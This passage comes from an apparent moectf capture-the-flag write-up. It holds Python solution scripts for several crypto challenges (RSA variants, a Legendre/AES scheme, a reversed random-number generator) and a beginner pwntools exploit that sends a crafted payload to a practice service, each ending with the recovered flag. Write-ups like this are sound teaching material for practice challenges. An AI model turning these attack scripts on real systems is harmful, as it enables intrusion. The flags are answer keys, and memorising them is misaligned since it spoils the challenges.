plaintext = bytes(bytes_list)
print(&quot;Recovered (raw bytes):&quot;, plaintext)
try:
    print(&quot;Recovered (utf-8):&quot;, plaintext.decode())
except:
    print(&quot;Recovered (decoded with errors ignored):&quot;, plaintext.decode(errors=&#39;ignore&#39;))
</code></pre>
<p><img src="/./image-20250810010221104.png" alt="./image-20250810010221104"></p>
<pre><code>moectf{Y0u_h@v3_ju5t_s01v3d_7h1s_pr0b13m!}
</code></pre>
<h3 id="6-happy-rsa"><a href="#6-happy-rsa" class="headerlink" title="6.happy rsa"></a>6.happy rsa</h3><pre><code class="python">import math

n = 128523866891628647198256249821889078729612915602126813095353326058434117743331117354307769466834709121615383318360553158180793808091715290853250784591576293353438657705902690576369228616974691526529115840225288717188674903706286837772359866451871219784305209267680502055721789166823585304852101129034033822731
e = 65537
c = 125986017030189249606833383146319528808010980928552142070952791820726011301355101112751401734059277025967527782109331573869703458333443026446504541008332002497683482554529670817491746530944661661838872530737844860894779846008432862757182462997411607513582892540745324152395112372620247143278397038318619295886
x = 522964948416919148730075013940176144502085141572251634384238148239059418865743755566045480035498265634350869368780682933647857349700575757065055513839460630399915983325017019073643523849095374946914449481491243177810902947558024707988938268598599450358141276922628627391081922608389234345668009502520912713141

disc = 4 * x - 3
sqrt_val = math.isqrt(disc)
if sqrt_val ** 2 == disc:
    s = (sqrt_val - 1) // 2
    phi = n - s
    d = pow(e, -1, phi)
    m = pow(c, d, n)
    flag = m.to_bytes((m.bit_length() + 7) // 8, &#39;big&#39;)
    print(flag.decode())
else:
    print(&quot;Not a perfect square&quot;)
 
&quot;&quot;&quot;

&quot;&quot;&quot;
</code></pre>
<h3 id="7-Ledengre-revenge"><a href="#7-Ledengre-revenge" class="headerlink" title="7.Ledengre_revenge"></a>7.<strong>Ledengre_revenge</strong></h3><pre><code class="python">from Cryptodome.Cipher import AES
from Cryptodome.Util.number import bytes_to_long, long_to_bytes
import copy

def function(x, p):
    if x &gt;= p:
        y = x
    elif pow(x, (p-1)//2, p) == 1:
        y = pow(x, 2, p)
    else:
        y = pow(x, 3, p)
    return y

p_ = 71583805456773770888820224577418671344500223401233301642692926000191389937709
key = 60679
aes_key = long_to_bytes(key &lt;&lt; 107)
cipher = AES.new(aes_key, AES.MODE_ECB)

a = [[239, 239, 251, 239], [233, 227, 233, 251], [251, 239, 251, 233], [233, 227, 251, 233]]

primes = set(sum(a, [])) | {251}

dict_pr_inv = {}
for pr in primes:
    inv = [[] for _ in range(256)]
    for x in range(256):
        y = function(x, pr)
        inv[y].append(x)
    dict_pr_inv[pr] = inv

def reverse_half(current, lis_input, a, dict_pr_inv, cipher):
    lis = copy.deepcopy(lis_input)
    for round_num in range(10):
        bit_matrix = [[ (lis[row][col] &amp; 1) for col in range(4)] for row in range(4)]
        for row in range(4):
            for col in range(4):
                lis[row][col] //= 2
        new_S = [[0 for _ in range(4)] for _ in range(4)]
        for row in range(4):
            for col in range(4):
                new_S[row][col] = current[row + 4 * col]
        temp_S = [[0 for _ in range(4)] for _ in range(4)]
        for row in range(4):
            for col in range(4):
                p2 = a[col][row]
                target = new_S[row][col]
                possibles = dict_pr_inv[p2][target]
                filtered = []
                for x in possibles:
                    greater = 1 if x &gt; (p2 // 2) else 0
                    if greater == bit_matrix[col][row]:
                        filtered.append(x)
                if len(filtered) != 1:
                    print(f&quot;Multiple or no possibilities at row {row}, col {col}, round {round_num}: {filtered}, target={target}, p2={p2}&quot;)
                    return None
                temp_S[row][col] = filtered[0]
        enc_S = [[0 for _ in range(4)] for _ in range(4)]
        for row in range(4):
            for col in range(4):
                target = temp_S[row][col]
                possibles = dict_pr_inv[251][target]
                if not possibles:
                    print(f&quot;No possibilities for target {target} with p=251 at row {row}, col {col}, round {round_num}&quot;)
                    return None
                enc_S[row][col] = possibles[0]
        enc = bytes([enc_S[row][col] for col in range(4) for row in range(4)])
        current = cipher.decrypt(enc)
    return current

lis0 = [[341, 710, 523, 1016], [636, 366, 441, 790], [637, 347, 728, 426], [150, 184, 421, 733]]
lis1 = [[133, 301, 251, 543], [444, 996, 507, 1005], [18, 902, 379, 878], [235, 448, 836, 263]]

ms = [30565192635368786249732024567787542864212990230048954769681860484383995323228, 41018612821404984639088200009631128480287233171184346873011065515807394614481]

for m in ms:
    final_concat = long_to_bytes(m)
    if len(final_concat) != 32:
        final_concat = b&#39;\x00&#39; * (32 - len(final_concat)) + final_concat
    text0 = final_concat[:16]
    text1 = final_concat[16:]
    flag0 = reverse_half(text0, lis0, a, dict_pr_inv, cipher)
    if flag0 is None:
        print(f&quot;Failed to decrypt text0 for m={m}&quot;)
        continue
    flag1 = reverse_half(text1, lis1, a, dict_pr_inv, cipher)
    if flag1 is None:
        print(f&quot;Failed to decrypt text1 for m={m}&quot;)
        continue
    flag = flag0 + flag1
    computed_key = 0
    for col in range(4):
        for row in range(4):
            idx = row + col * 4
            v = bytes_to_long(flag[idx*2 : idx*2 + 2])
            w = pow(v, -2, p_) + 1
            leg = pow(w, (p_-1)//2, p_)
            bit = ((leg + 1) % p_ // 2)
            computed_key = computed_key * 2 + bit
    if computed_key == key:
        print(&quot;Flag:&quot;, flag)
        break
    else:
        print(f&quot;Computed key {computed_key} does not match expected key {key} for m={m}&quot;) &quot;&quot;&quot;
        Flag: b&#39;moectf{E@5Y_1eGendre_@nd_@ES*10}&#39;
&quot;&quot;&quot;
</code></pre>
<h3 id="8-easy-gcd"><a href="#8-easy-gcd" class="headerlink" title="8.easy_gcd"></a>8.easy_gcd</h3><pre><code class="python">from Cryptodome.Util.number import long_to_bytes
from math import gcd

def trim_poly(p):
    while len(p) &gt; 0 and p[-1] == 0:
        p.pop()

def poly_mul(a, b, n):
    res = [0] * (len(a) + len(b) - 1)
    for i in range(len(a)):
        for j in range(len(b)):
            res[i + j] = (res[i + j] + a[i] * b[j]) % n
    trim_poly(res)
    return res

def poly_div(dividend, divisor, n):
    dividend = dividend[:]
    divisor = divisor[:]
    trim_poly(dividend)
    trim_poly(divisor)
    if len(divisor) == 0:
        raise ValueError(&quot;Division by zero polynomial&quot;)
    if len(dividend) &lt; len(divisor):
        return [0], dividend
    q = [0] * (len(dividend) - len(divisor) + 1)
    for i in range(len(dividend) - len(divisor), -1, -1):
        base = divisor[-1]
        try:
            inv = pow(base, -1, n)
            coeff = (dividend[i + len(divisor) - 1] * inv) % n
        except ValueError:
            print(&quot;Inverse failed, attempting to factor n...&quot;)
            g = gcd(base, n)
            if 1 &lt; g &lt; n:
                p = g
                q = n // p
                phi_calc = (p - 1) * (q - 1)
                if pow(phi_calc, e, n) == enc_phi:
                    print(&quot;Phi verified&quot;)
                    d_calc = pow(e, -1, phi_calc)
                    if pow(d_calc, e, n) == enc_d:
                        print(&quot;D verified&quot;)
                        flag_int = pow(enc_flag, d_calc, n)
                        flag = long_to_bytes(flag_int)
                        print(&quot;Flag:&quot;, flag)
                    else:
                        print(&quot;D not verified&quot;)
                else:
                    print(&quot;Phi not verified&quot;)
            else:
                print(&quot;Invalid factor, base=&quot;, base)
            import sys
            sys.exit(0)
        q[i] = coeff
        for j in range(len(divisor)):
            dividend[i + j] = (dividend[i + j] - coeff * divisor[j]) % n
    trim_poly(dividend)
    return q, dividend

def poly_gcd(f, g, n):
    f = f[:]
    g = g[:]
    trim_poly(f)
    trim_poly(g)
    while len(g) &gt; 0:
        q, r = poly_div(f, g, n)
        f = g
        g = r
        trim_poly(g)
    return f

e = 11
n = 31166099657280475125475535365831782783093875463247358362475188588947278779261659087382153841735341294644470135658242563894811427195085499234687959821014213884097144683916979145688501653937652132196507641706592058541461494851978378234097501450088696202067780458185699118745693112795064523774316076900622924515043087514299819363383005261432426124907190050031873969718731577577610423430342011833399812571330259167141343053584093492407110726050289284883569075898031613703838488237576756303655189545592872431914967027530453720947545137077577544615857606624432667091058064432254815560483584621525418467954592836937243988243
enc_d = 13808910452602719582082356538103809869422886228259509560372242093772427733416618401205696740074353028623820317050192627491660359558892392153999532272857339481298482802886251848703046960504786528793589170539584003383632027476914361574273144291330585735179166690513545471901763697269194228467287645573188775899890375853801796593582850975578804671547453457528686518397397234277841944184055117669277697362945463508844599947716337314398521363079749738943908860398843430518505690528296941997988869732759053587554475692300841912141199296010163641185664377742397777941968394746150611710777000625916609542525700860321528867212
enc_phi = 7712799451523923934297438340493818709638100911475880659269081521797448094000671886662453371669377561442768781648787281763679814952312810588749220640616349121013802986627369725105748412428708271146640375251603852154891826036699121824706508396445679193881511426962350499448921650925902083009038656420224517990418144263810608916613943703387804258988710100695100014625921151006914635066745373266932452264209581055597451243351753611834270245107587926127995770837997657200564139159783438755362906511732933456755615781562673235575025697927723044975521898510169824612319133648292886516647301360818651593931313229819219102145
enc_flag = 894510730103475572849584456948777906177928458037601077973815297094718207962800841050676989919558783959100151883021776468599378605624814726543232609670826195546342526501910728018180564277901156145145431115589678554941920392777979439329210254339330200637295639957614541733453280727879958971862238162005775966684182859139832583501267115086918765938983728386252082360729694525611252282765144977858082339098241367689924035089953114271269967974794791094625994785638389602317004891381734713155429498571328372671258967340771255624802290579938944569672935599910907961053536945947262426210286500553262856689698523083914877686

f = [0] * (e + 1)
f[0] = (-enc_d) % n
f[e] = 1
trim_poly(f)

for k in range(1, 11):
    poly = [1]
    for _ in range(e):
        poly = poly_mul(poly, [(-1) % n, e % n], n)
    ke = pow(k, e, n)
    enc_phi_k = (ke * enc_phi) % n
    poly[0] = (poly[0] - enc_phi_k) % n
    trim_poly(poly)
    gcd_poly = poly_gcd(f, poly, n)
    trim_poly(gcd_poly)
    if len(gcd_poly) == 2:
        lead = gcd_poly[1]
        try:
            inv_lead = pow(lead, -1, n)
        except ValueError:
            g = gcd(lead, n)
            if 1 &lt; g &lt; n:
                p = g
                q = n // p
                phi_calc = (p - 1) * (q - 1)
                if pow(phi_calc, e, n) == enc_phi:
                    d_calc = pow(e, -1, phi_calc)
                    if pow(d_calc, e, n) == enc_d:
                        flag_int = pow(enc_flag, d_calc, n)
                        flag = long_to_bytes(flag_int)
                        print(&quot;Flag:&quot;, flag)
                    else:
                        print(&quot;D not verified&quot;)
                else:
                    print(&quot;Phi not verified&quot;)
            else:
                print(&quot;Invalid factor for lead&quot;)
            continue
        const = (gcd_poly[0] * inv_lead) % n
        d = (-const) % n
        if pow(d, e, n) == enc_d:
            flag_int = pow(enc_flag, d, n)
            flag = long_to_bytes(flag_int)
            print(&quot;Flag:&quot;, flag)
            break
</code></pre>
<h3 id="9-杂交随机数"><a href="#9-杂交随机数" class="headerlink" title="9.杂交随机数"></a>9.<strong>杂交随机数</strong></h3><pre><code class="python">l = 116
m = 1 &lt;&lt; l
a = -233
a_mod = a % m
inv_a = pow(a_mod, -1, m)
N = 4567941593066862873653209393990031966807270114415459425382356207107640
curr_L_int = N &gt;&gt; l
curr_R_int = N &amp; (m - 1)
stack = [(curr_L_int, curr_R_int, 0)]
while stack:
    L_int, R_int, steps = stack.pop()
    if steps == 2025:
        original_int = (L_int &lt;&lt; l) | R_int
        flag_bytes = original_int.to_bytes(29, &#39;big&#39;)
        try:
            flag = flag_bytes.decode(&#39;utf-8&#39;)
            if flag.startswith(&#39;moectf{&#39;) and flag.endswith(&#39;}&#39;):
                print(flag)
        except UnicodeDecodeError:
            pass
        continue
    S = R_int &gt;&gt; 1
    last_bit = R_int &amp; 1
    p_S = S.bit_count() % 2
    for b in [0, 1]:
        prev_L_int = (b &lt;&lt; (l - 1)) + S
        diff = (L_int - prev_L_int) % m
        prev_R_int = (inv_a * diff) % m
        p_R = prev_R_int.bit_count() % 2
        if (b ^ p_S ^ p_R) == last_bit:
            stack.append((prev_L_int, prev_R_int, steps + 1))
    &quot;&quot;&quot;
    moectf{I5_1t_Stream0rBlock.?}
    &quot;&quot;&quot;
</code></pre>
<h2 id="4-pwn"><a href="#4-pwn" class="headerlink" title="4.pwn"></a>4.pwn</h2><h3 id="1-0-二进制漏洞审计入门指北"><a href="#1-0-二进制漏洞审计入门指北" class="headerlink" title="1.0 二进制漏洞审计入门指北"></a>1.<strong>0 二进制漏洞审计入门指北</strong></h3><pre><code class="python">from pwn import *
from pwn import *                                    # 导入 pwntools。
context(arch=&#39;amd64&#39;, os=&#39;linux&#39;, log_level=&#39;debug&#39;) # 一些基本的配置。
 
# 有时我们需要在本地调试运行程序，需要配置 context.terminal。详见入门指北。
 
# io = process(&#39;./pwn&#39;)             # 在本地运行程序。
# gdb.attach(io)                    # 启动 GDB
io = connect(&#39;127.0.0.1&#39;, 52202)              # 与在线环境交互。
io.sendline(b&#39;114511&#39;)              # 什么时候用 send 什么时候用 sendline？
 
payload  = p32(0xdeadbeef)          # p32(0xdeadbeef)、b&quot;\xde\xad\xbe\xef&quot;、b&quot;deadbeef&quot; 有什么区别？
                                    # 你看懂原程序这里的检查逻辑了吗？
payload += b&#39;shuijiangui&#39;           # strcmp
 
io.sendafter(b&#39;password.&#39;, payload) # 发送！通过所有的检查。
 
io.interactive()                    # 手动接收 flag。
</code></pre>
<p><img src="/./image-20250809155539550.png" alt="./image-20250809155539550"></p>
<pre><code>moectf{THe-b3GlnniNG_0F_forMat85451c15}
</code></pre>
